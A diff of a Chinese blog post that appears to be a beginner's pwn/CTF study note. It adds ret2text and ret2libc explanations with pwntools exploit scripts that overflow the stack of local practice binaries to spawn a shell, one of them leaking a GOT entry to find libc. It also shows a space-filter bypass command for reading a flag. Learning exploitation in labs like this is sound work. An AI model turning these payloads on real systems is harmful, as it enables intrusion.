@@ -19,23 +19,26 @@
   <meta name="author" content="Nefelibata">
   <meta name="keywords" content="">
   
-    <meta name="description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag Ret2textx32位最简单：有system有binsh 后门函数的地址到传参的地址 123456from pwn import *p &#x3D; process(&quot;.&#x2F;ret2text&quot;)sy">
+    <meta name="description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag 通过构造和发送一个有效载荷，利用缓存区溢出漏洞 先调用pwntools库 利用process函数建立一个进程 Ret2textx32位最简单：有system有binsh 有后门函数的地址（直接system">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn学习之路">
 <meta property="og:url" content="http://example.com/2024/12/17/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
 <meta property="og:site_name" content="星期六不上发条">
-<meta property="og:description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag Ret2textx32位最简单：有system有binsh 后门函数的地址到传参的地址 123456from pwn import *p &#x3D; process(&quot;.&#x2F;ret2text&quot;)sy">
+<meta property="og:description" content="NSS-pwn 第一题  输入su 进入root模式；(管理员模式) binsh    &#x2F;bin&#x2F;sh    sh bash &#x2F; c’at’$IFS$9flag 通过构造和发送一个有效载荷，利用缓存区溢出漏洞 先调用pwntools库 利用process函数建立一个进程 Ret2textx32位最简单：有system有binsh 有后门函数的地址（直接system">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181900612.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182000685.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172125376.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172203436.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181911976.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182010114.png">
 <meta property="article:published_time" content="2024-12-17T11:01:32.000Z">
-<meta property="article:modified_time" content="2024-12-17T14:04:25.883Z">
+<meta property="article:modified_time" content="2024-12-18T13:47:37.372Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181900612.png">
   
   
   
@@ -228,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          250 字
+          670 字
         
       </span>
     
@@ -239,7 +242,7 @@
         
         
         
-          3 分钟
+          6 分钟
         
       </span>
     
@@ -281,7 +284,9 @@
             
               <div class="markdown-body">
                 
-                <p>NSS-pwn 第一题</p>
+                <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181900612.png" srcset="/img/loading.gif" lazyload alt="image-20241218190029502"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182000685.png" srcset="/img/loading.gif" lazyload alt="image-20241218200048617"></p>
+<p>NSS-pwn 第一题</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png" srcset="/img/loading.gif" lazyload></p>
 <p>输入su</p>
 <p>进入root模式；(管理员模式)</p>
@@ -289,8 +294,11 @@
 <p>bash</p>
 <p>&#x2F;</p>
 <p>c’at’$IFS$9flag</p>
+<p>通过构造和发送一个有效载荷，利用缓存区溢出漏洞</p>
+<p>先调用pwntools库</p>
+<p>利用process函数建立一个进程</p>
 <h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><h3 id="x32位"><a href="#x32位" class="headerlink" title="x32位"></a>x32位</h3><p>最简单：有system有binsh</p>
-<p>后门函数的地址到传参的地址</p>
+<p>有后门函数的地址（直接system（binsh））</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>system = <span class="hljs-number">0x008048506</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 
@@ -303,11 +311,37 @@
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png" srcset="/img/loading.gif" lazyload alt="image-20241217215337601"></p>
 <h5 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h5><p>64位架构中，系统要求函数调用前堆栈必须16字节对齐。因为64位函数在执行时要求堆栈在特定的对齐条件下。</p>
 <h5 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h5><p>保证payload要求是16的倍数（p64是将其转换成8字节）</p>
-<h5 id="p64是什么意思"><a href="#p64是什么意思" class="headerlink" title="p64是什么意思"></a>p64是什么意思</h5><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png" srcset="/img/loading.gif" lazyload alt="image-20241217215212527"></p>
-<h5 id="字节-字符-字节串"><a href="#字节-字符-字节串" class="headerlink" title="字节&amp;字符&amp;字节串"></a>字节&amp;字符&amp;字节串</h5><h6 id="字节Byte"><a href="#字节Byte" class="headerlink" title="字节Byte"></a>字节Byte</h6><p>数据在内存&#x2F;程序中以字节的形式储存。</p>
+<h4 id="p64是什么意思"><a href="#p64是什么意思" class="headerlink" title="p64是什么意思"></a>p64是什么意思</h4><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png" srcset="/img/loading.gif" lazyload alt="image-20241217215212527"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181911976.png" srcset="/img/loading.gif" lazyload alt="image-20241218191118934"></p>
+<h4 id="字节-字符-字节串"><a href="#字节-字符-字节串" class="headerlink" title="字节&amp;字符&amp;字节串"></a>字节&amp;字符&amp;字节串</h4><h6 id="字节Byte"><a href="#字节Byte" class="headerlink" title="字节Byte"></a>字节Byte</h6><p>数据在内存&#x2F;程序中以字节的形式储存。</p>
 <p>1个字节有由8个bit组成</p>
 <p>‘A’占一个字节，其二进制表示为 <code>01000001</code></p>
-<h6 id="字符Character"><a href="#字符Character" class="headerlink" title="字符Character"></a>字符Character</h6><h6 id="字节串Bytes"><a href="#字节串Bytes" class="headerlink" title="字节串Bytes"></a>字节串Bytes</h6><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172203436.png" srcset="/img/loading.gif" lazyload alt="image-20241217220312338"></p>
+<h6 id="字符Character"><a href="#字符Character" class="headerlink" title="字符Character"></a>字符Character</h6><h6 id="字节串Bytes"><a href="#字节串Bytes" class="headerlink" title="字节串Bytes"></a>字节串Bytes</h6><p>用b’ ‘或b” “表示</p>
+<h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>寻找binsh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>system = <span class="hljs-number">0x8048519</span><br>binsh = <span class="hljs-number">0x0804A028</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)+p32(system)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Ret2libc2"><a href="#Ret2libc2" class="headerlink" title="Ret2libc2"></a>Ret2libc2</h2><p>有sys没有binsh</p>
+<p>需要自己填入;</p>
+<p>查看地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182010114.png" srcset="/img/loading.gif" lazyload alt="image-20241218201007056"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br>system = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>gets = elf.plt[<span class="hljs-string">&quot;gets&quot;</span>]<br>bss = <span class="hljs-number">0x0804A200</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload += p32(gets)+p32(system)+p32(bss)+p32(bss)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><h5 id="没有system，没有binsh"><a href="#没有system，没有binsh" class="headerlink" title="没有system，没有binsh"></a>没有system，没有binsh</h5><p>32位：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>p = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) //利用vmmap<br><br>gets_got = elf.got[<span class="hljs-string">&quot;gets&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>main_addr = <span class="hljs-number">0x0804854E</span>                     //回到main函数再次栈溢出<br><br>p.recvuntil(<span class="hljs-string">b&quot;ret2libc3\n&quot;</span>)<br>payload1 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload1 += p32(puts_plt)+p32(main_addr)+p32(gets_got)    <br>p.sendline(payload1)                      //打印出gets函数的got表<br><br>leak_addr = u32(p.recv(<span class="hljs-number">4</span>))                 //接收，转换成整数<br>libc_base = leak_addr - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>]   //算偏移<br><br><br><br><br>///////////第一种<br><br>libc.address = libc_base                   //整合<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]               //找到system函数在libc库中的偏移<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))      //binsh在libc库的偏移<br><span class="hljs-comment"># p.recvuntil(&quot;ret2libc3\n&quot;)</span><br>payload2 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload2 +=p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)   //再次栈溢出，此时有system函数的地址，有binsh的地址<br>p.sendline(payload2)<br>p.interactive()<br><br>/////////第二种<br><br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]+libc_base<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))+libc_base<br><span class="hljs-comment"># p.recvuntil(&quot;ret2libc3\n&quot;)</span><br>payload2 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload2 +=p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="栈溢出题型："><a href="#栈溢出题型：" class="headerlink" title="栈溢出题型："></a>栈溢出题型：</h2><p>1.有system，有binsh—-直接&#x2F;shift+f12调用</p>
+<p>2.有system，无binsh—-</p>
+<p>x32–利用bss段填入binsh</p>
+<p>x64–利用pop</p>
+<p>3.没system，没binsh</p>
+<p>x32—-利用栈结构传参</p>
+<p>x64—-pop利用寄存器传参</p>
 
                 
               </div>
